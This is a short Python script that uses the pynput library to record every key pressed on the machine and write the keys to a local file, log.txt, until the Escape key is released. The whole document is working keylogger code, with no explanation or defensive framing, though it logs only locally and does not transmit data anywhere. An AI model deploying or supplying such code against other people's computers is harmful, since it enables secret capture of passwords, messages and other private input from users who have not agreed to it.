from pynput.keyboard import Key, Listener
import numpy as np

keys = []

def on_each_key_press(key):
    keys.append(key)
    write_keys_to_file(keys)


def write_keys_to_file(keys):
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)


def on_each_key_release(key):
    if key == Key.esc:
        return False


with Listener(
    on_press = on_each_key_press,
    on_release = on_each_key_release
    ) as listener:
    listener.join()
